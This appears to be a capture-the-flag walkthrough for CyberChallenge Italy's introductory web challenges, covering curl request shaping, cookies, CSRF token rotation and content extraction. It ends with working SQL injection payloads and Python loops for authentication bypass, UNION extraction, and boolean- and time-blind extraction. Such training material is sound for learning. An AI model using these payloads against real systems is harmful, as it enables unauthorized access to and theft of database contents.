# Introduction — Web Security

> **Foundations series.** These are the introductory challenges: the platform walks you
> through each step. Instead of a full write-up per challenge, this is a compact walkthrough
> grouped by technique
>
> For the reasoned, in-depth write-ups see the [`training/`](../training) section.

**Platform:** CyberChallenge Italy · **Category:** Web Security

---

## HTTP fundamentals — shaping the request

| # | What it teaches | Technique / key command |
|---|-----------------|--------------------------|
| 01 | A bare HTTP request | `curl <url>` |
| 02 | Query-string parameters | `curl "<url>?id=flag"` |
| 03 | Custom request headers | `curl -H "X-Password: admin" <url>` |
| 04 | Content negotiation | `curl -H "Accept: application/xml" <url>` |

## Cookies & sessions

| # | What it teaches | Technique |
|---|-----------------|-----------|
| 05 | Sending a cookie | `curl -b "password=admin" <url>` |
| 06 | Persisting a received cookie | `curl -c jar.txt <url>/token` (save), then `curl -b jar.txt <url>/flag` (send) |

*Concept:* `-c` is the cookie **jar** (write what the server sets), `-b` sends cookies back —
the basis of every session mechanism.

## HTTP methods

| # | What it teaches | Technique |
|---|-----------------|-----------|
| 07 | `HEAD` (headers only) | `curl -I <url>` |
| 08 | Traditional form `POST` | `curl -d "username=admin&password=admin" <url>` |
| 09 | JSON body `POST` | `curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' <url>` |
| 10 | Method enumeration | `curl -I -X OPTIONS <url>`, then force the allowed verb (`PUT`/`PATCH`) even if not advertised |

## CSRF token flow

**11 — Stateful anti-CSRF tokens.**
Each response hands you a fresh token you must send with the next request. The trick is to
*rotate* it every round rather than reuse the first one
(full script: [`solve_web11.py`](./solve_web11.py)):

```python
tok = login()["csrf"]
for i in range(4):
    r = session.get("/flag_piece", params={"index": i, "csrf": tok}).json()
    flag += r["flag_piece"]
    tok = r["csrf"]            
```

## Content extraction

| # | What it teaches | Technique |
|---|-----------------|-----------|
| 12 | Regex-grep the response body | `curl -s <url> \| grep -oE "flag\{.*\}"` |
| 13 | Parse specific HTML elements | `curl -s <url> \| pup 'span.red text{}'` |
| 14 | Flags hidden in HTML comments | `curl -s <url> \| less`, then `/flag` |
| 15 | Mapping every loaded resource | Burp Suite → *Target ▸ Site map* / *Proxy ▸ HTTP history*, search `flag` |
| 16 | Automated spidering | OWASP ZAP → *Automated Scan*, then search `flag{` in results |

*Concept:* the flag may sit in the raw body, an attribute, a comment, or a secondary resource
(JS/CSS) the page pulls in — so you learn to inspect the whole response, not just the render.

## SQL injection — the four classic shapes

This is the payoff of the track: the same bug, escalating in difficulty as the server leaks
less and less information back to you.

**17 — Logic (authentication bypass).** The input closes the string and forces a true condition:

```sql
foo' OR 1=1 -- -
```

**18 — UNION-based extraction.** Match the column count and append your own row from another table:

```sql
' UNION SELECT flag, 2, 3, 4, 5, 6 FROM real_data -- -
```

**19 — Boolean blind.** No output, only success/failure. Ask one true/false question per hex
nibble and rebuild the flag (full script: [`solve_web19.py`](./solve_web19.py)):

```python
payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
for c in "0123456789abcdef":
    if inj.blind(payload.format(result + c))[0] == "Success":
        result += c            
```

**20 — Time-based blind.** Not even success/failure — only *how long* the server takes. A
deliberate `SLEEP(1)` becomes the oracle (full script: [`solve_web20.py`](./solve_web20.py)):

```python
q = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
start = time.time(); inj.time(q)
if time.time() - start > 0.95:   
    result += c
```

---